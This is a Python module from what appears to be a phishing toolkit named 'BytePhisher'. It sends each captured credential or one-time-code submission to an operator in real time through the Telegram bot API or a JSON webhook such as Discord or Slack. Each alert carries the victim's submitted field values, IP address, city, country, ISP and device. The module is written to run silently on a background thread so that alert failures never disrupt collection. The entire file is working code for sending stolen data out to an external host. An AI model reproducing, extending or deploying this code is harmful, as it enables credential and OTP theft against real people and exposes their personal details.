# BytePhisher — real-time capture notifications.
#
# Fires on every credential/OTP capture so an operator gets an instant ping
# instead of polling the dashboard. Supports:
#   * Telegram bot API      (--telegram TOKEN:CHAT_ID)
#   * generic JSON webhook  (--webhook URL)  -> Discord, Slack, n8n, Mattermost…
# or any combination. Uses only urllib, so no extra dependencies.
#
# Never raises into the capture path: the HTTP handler wraps every call in
# try/except and notifications run on a daemon thread, so a dead webhook can
# never slow down or break a submission.

import json
import threading
import time
import urllib.request

def format_capture(c):
    """Human-readable one-message summary of a capture dict."""
    from . import risk as _risk
    ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(c.get("ts") or time.time()))
    kind = "CREDENTIALS" if c.get("is_cred") else "FIELDS"
    r = int(c.get("risk") or 0)
    lines = [
        f"[BytePhisher] {kind} captured",
        f"campaign : {c.get('campaign') or c.get('template') or '?'}",
        f"time     : {ts}",
        f"risk     : {r}/100 ({_risk.level(r)})"
        + (f" — {'; '.join(c.get('risk_reasons') or [])}" if c.get("risk_reasons") else ""),
        f"ip       : {c.get('ip', '?')}",
        f"geo      : {', '.join(x for x in [c.get('city'), c.get('country')] if x) or '—'}",
        f"isp      : {c.get('isp') or '—'}",
        f"device   : {c.get('device', '?')}",
        "fields   : " + "; ".join(f"{k}={v}" for k, v in list((c.get("fields") or {}).items())[:8]),
    ]
    return "\n".join(lines)

def _post_json(url, payload, timeout=8):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data,
                                 headers={"Content-Type": "application/json",
                                          "User-Agent": "bytephisher/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read()[:400]

TELEGRAM_API_BASE = "https://api.telegram.org"   # overridable for tests

def send_telegram(token, chat_id, text, timeout=8):
    url = f"{TELEGRAM_API_BASE}/bot{token}/sendMessage"
    return _post_json(url, {"chat_id": chat_id, "text": text, "disable_web_page_preview": True},
                      timeout)

def send_webhook(url, c, text, timeout=8):
    # Discord wants `content`, Slack wants `text` — send both keys.
    return _post_json(url, {"content": text, "text": text,
                            "capture": c}, timeout)

def make_notifier(telegram=None, webhook=None, telegram_api=None, async_=True):
    """Build the on_capture callback.

    telegram: "TOKEN:CHAT_ID" (or a (token, chat_id) tuple)
    webhook:  full URL receiving a JSON POST
    telegram_api: override the API base (used by tests to point at a local stub)
    """
    token = chat_id = None
    if telegram:
        if isinstance(telegram, (tuple, list)):
            token, chat_id = telegram
        else:
            token, _, chat_id = str(telegram).partition(":")

    def _fire(c):
        text = format_capture(c)
        if token and chat_id:
            send_telegram(token, chat_id, text)
        if webhook:
            send_webhook(webhook, c, text)

    def notify(c):
        if async_:
            threading.Thread(target=lambda: _safe(_fire, c), daemon=True).start()
        else:
            _safe(_fire, c)

    return notify

def _safe(fn, c):
    """Never let a notification error escape (webhook down != lost capture)."""
    try:
        fn(c)
    except Exception as e:
        print(f"[bytephisher] alert failed: {type(e).__name__}: {e}")
